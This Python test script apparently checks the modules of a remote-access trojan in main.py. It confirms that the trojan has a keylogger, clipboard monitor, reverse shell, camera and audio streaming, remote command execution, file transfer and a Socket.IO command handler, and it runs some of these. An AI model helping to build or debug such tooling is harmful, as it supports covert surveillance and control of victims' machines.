#!/usr/bin/env python3
"""
Comprehensive scan test to check for any potential issues, errors, or bugs in main.py
"""

import sys
import traceback

def test_imports():
    """Test that all imports work correctly."""
    print("Testing imports...")
    
    try:
        import main
        print("✅ Main module imports successfully")
        return True
    except Exception as e:
        print(f"❌ Import failed: {e}")
        traceback.print_exc()
        return False

def test_global_variables():
    """Test that all required global variables are defined."""
    print("\nTesting global variables...")
    
    try:
        import main
        
        required_vars = [
            'SERVER_URL',
            'STREAMING_ENABLED',
            'STREAM_THREAD',
            'AUDIO_STREAMING_ENABLED',
            'AUDIO_STREAM_THREAD',
            'CAMERA_STREAMING_ENABLED',
            'CAMERA_STREAM_THREAD',
            'KEYLOGGER_ENABLED',
            'KEYLOGGER_THREAD',
            'CLIPBOARD_MONITOR_ENABLED',
            'CLIPBOARD_MONITOR_THREAD',
            'REVERSE_SHELL_ENABLED',
            'REVERSE_SHELL_SOCKET',
            'REVERSE_SHELL_THREAD',
            'VOICE_CONTROL_ENABLED',
            'VOICE_CONTROL_THREAD',
            'sio',
            'background_initializer',
        ]
        
        missing_vars = []
        for var in required_vars:
            if not hasattr(main, var):
                missing_vars.append(var)
            else:
                print(f"✅ {var}: OK")
        
        if missing_vars:
            print(f"❌ Missing variables: {missing_vars}")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Global variables test failed: {e}")
        return False

def test_critical_functions():
    """Test that all critical functions exist."""
    print("\nTesting critical functions...")
    
    try:
        import main
        
        required_functions = [
            'get_or_create_agent_id',
            'execute_command',
            'handle_file_upload',
            'handle_file_download',
            'start_streaming',
            'stop_streaming',
            'start_audio_streaming',
            'stop_audio_streaming',
            'start_camera_streaming',
            'stop_camera_streaming',
            'start_keylogger',
            'stop_keylogger',
            'start_clipboard_monitor',
            'stop_clipboard_monitor',
            'start_reverse_shell',
            'stop_reverse_shell',
            'start_voice_control',
            'stop_voice_control',
        ]
        
        missing_functions = []
        for func in required_functions:
            if not hasattr(main, func):
                missing_functions.append(func)
            else:
                print(f"✅ {func}: OK")
        
        if missing_functions:
            print(f"❌ Missing functions: {missing_functions}")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Critical functions test failed: {e}")
        return False

def test_socketio_handlers():
    """Test that Socket.IO event handlers are properly configured."""
    print("\nTesting Socket.IO handlers...")
    
    try:
        import main
        
        required_handlers = [
            'connect',
            'disconnect',
            'on_command',
        ]
        
        missing_handlers = []
        for handler in required_handlers:
            if not hasattr(main, handler):
                missing_handlers.append(handler)
            else:
                print(f"✅ {handler}: OK")
        
        if missing_handlers:
            print(f"❌ Missing handlers: {missing_handlers}")
            return False
        
        # Check that the command handler uses the correct event name
        import inspect
        on_command_source = inspect.getsource(main.on_command)
        if '@sio.on(\'command\')' in on_command_source:
            print("✅ Command handler uses correct event name")
        else:
            print("❌ Command handler uses wrong event name")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Socket.IO handlers test failed: {e}")
        return False

def test_controller_variables():
    """Test that controller-related variables are defined."""
    print("\nTesting controller variables...")
    
    try:
        import main
        
        required_vars = [
            'controller_app',
            'controller_socketio',
            'agents_data',
            'connected_agents',
        ]
        
        missing_vars = []
        for var in required_vars:
            if not hasattr(main, var):
                missing_vars.append(var)
            else:
                print(f"✅ {var}: OK")
        
        if missing_vars:
            print(f"❌ Missing controller variables: {missing_vars}")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Controller variables test failed: {e}")
        return False

def test_audio_config():
    """Test that audio configuration is properly set up."""
    print("\nTesting audio configuration...")
    
    try:
        import main
        
        # Check audio config variables
        audio_vars = ['CHUNK', 'FORMAT', 'CHANNELS', 'RATE']
        for var in audio_vars:
            if hasattr(main, var):
                print(f"✅ {var}: {getattr(main, var)}")
            else:
                print(f"❌ Missing audio config: {var}")
                return False
        
        # Check that FORMAT is properly handled when PyAudio is not available
        if not main.PYAUDIO_AVAILABLE and main.FORMAT is None:
            print("✅ Audio format properly handled when PyAudio unavailable")
        elif main.PYAUDIO_AVAILABLE and main.FORMAT is not None:
            print("✅ Audio format properly set when PyAudio available")
        else:
            print("❌ Audio format configuration issue")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Audio configuration test failed: {e}")
        return False

def test_background_initializer():
    """Test that BackgroundInitializer is properly set up."""
    print("\nTesting BackgroundInitializer...")
    
    try:
        import main
        
        if hasattr(main, 'background_initializer'):
            print("✅ BackgroundInitializer instance exists")
            
            # Check that it's an instance of the class
            if isinstance(main.background_initializer, main.BackgroundInitializer):
                print("✅ BackgroundInitializer is properly instantiated")
            else:
                print("❌ BackgroundInitializer is not properly instantiated")
                return False
        else:
            print("❌ BackgroundInitializer instance missing")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ BackgroundInitializer test failed: {e}")
        return False

def test_unused_code():
    """Test for potentially unused or problematic code."""
    print("\nTesting for unused/problematic code...")
    
    try:
        import main
        
        # Check if agent_main function exists but is not used
        if hasattr(main, 'agent_main'):
            print("⚠️ agent_main function exists but may not be used in simplified main")
        
        # Check if main_unified function exists but is not used
        if hasattr(main, 'main_unified'):
            print("⚠️ main_unified function exists but may not be used in simplified main")
        
        # Check if signal_handler exists but is not used
        if hasattr(main, 'signal_handler'):
            print("⚠️ signal_handler function exists but may not be used in simplified main")
        
        # Check if BackgroundInitializer is being used
        if hasattr(main, 'background_initializer'):
            print("⚠️ background_initializer exists but may not be used in simplified main")
        
        print("✅ Unused code check completed")
        return True
        
    except Exception as e:
        print(f"❌ Unused code test failed: {e}")
        return False

def test_function_calls():
    """Test that critical functions can be called without errors."""
    print("\nTesting function calls...")
    
    try:
        import main
        
        # Test get_or_create_agent_id
        try:
            agent_id = main.get_or_create_agent_id()
            print(f"✅ get_or_create_agent_id: {agent_id}")
        except Exception as e:
            print(f"❌ get_or_create_agent_id failed: {e}")
            return False
        
        # Test execute_command with a simple command
        try:
            result = main.execute_command("echo 'test'")
            print(f"✅ execute_command: {result[:50]}...")
        except Exception as e:
            print(f"❌ execute_command failed: {e}")
            return False
        
        # Test file upload handler
        try:
            import base64
            test_content = "test"
            test_content_b64 = base64.b64encode(test_content.encode()).decode()
            result = main.handle_file_upload(['upload-file', './test.txt', test_content_b64])
            print(f"✅ handle_file_upload: {result}")
            
            # Cleanup
            import os
            if os.path.exists('./test.txt'):
                os.remove('./test.txt')
        except Exception as e:
            print(f"❌ handle_file_upload failed: {e}")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Function calls test failed: {e}")
        return False

def test_socketio_connection():
    """Test Socket.IO connection setup."""
    print("\nTesting Socket.IO connection...")
    
    try:
        import main
        
        if main.SOCKETIO_AVAILABLE:
            print("✅ Socket.IO available")
            
            if main.sio:
                print("✅ Socket.IO client created")
                
                # Check SSL verification setting
                if hasattr(main.sio, 'ssl_verify'):
                    print(f"✅ SSL verify setting: {main.sio.ssl_verify}")
                else:
                    print("✅ Socket.IO client exists (ssl_verify not accessible)")
            else:
                print("❌ Socket.IO client not created")
                return False
        else:
            print("❌ Socket.IO not available")
            return False
        
        return True
        
    except Exception as e:
        print(f"❌ Socket.IO connection test failed: {e}")
        return False

def main():
    """Run all comprehensive tests."""
    print("=" * 80)
    print("COMPREHENSIVE SCAN TEST - Checking for Issues, Errors, and Bugs")
    print("=" * 80)
    
    tests = [
        ("Imports", test_imports),
        ("Global Variables", test_global_variables),
        ("Critical Functions", test_critical_functions),
        ("Socket.IO Handlers", test_socketio_handlers),
        ("Controller Variables", test_controller_variables),
        ("Audio Configuration", test_audio_config),
        ("BackgroundInitializer", test_background_initializer),
        ("Unused Code", test_unused_code),
        ("Function Calls", test_function_calls),
        ("Socket.IO Connection", test_socketio_connection),
    ]
    
    passed = 0
    total = len(tests)
    
    for test_name, test_func in tests:
        print(f"\n{'='*20} {test_name} {'='*20}")
        try:
            if test_func():
                passed += 1
                print(f"✅ {test_name} passed")
            else:
                print(f"❌ {test_name} failed")
        except Exception as e:
            print(f"❌ {test_name} failed with exception: {e}")
            traceback.print_exc()
    
    print("\n" + "=" * 80)
    print(f"COMPREHENSIVE SCAN RESULTS: {passed}/{total} tests passed")
    print("=" * 80)
    
    if passed == total:
        print("🎉 ALL TESTS PASSED! No critical issues found.")
        print("✅ All imports work correctly")
        print("✅ All global variables are defined")
        print("✅ All critical functions exist")
        print("✅ Socket.IO handlers are properly configured")
        print("✅ Controller variables are defined")
        print("✅ Audio configuration is correct")
        print("✅ BackgroundInitializer is properly set up")
        print("✅ Function calls work correctly")
        print("✅ Socket.IO connection is properly configured")
    else:
        print("⚠️ Some tests failed. Please review the errors above.")
        print("🔧 Issues found that may need attention:")
        print("   - Check missing variables or functions")
        print("   - Verify Socket.IO configuration")
        print("   - Review unused code that may cause confusion")
        print("   - Test function calls that failed")
    
    return passed == total

if __name__ == "__main__":
    success = main()
    sys.exit(0 if success else 1)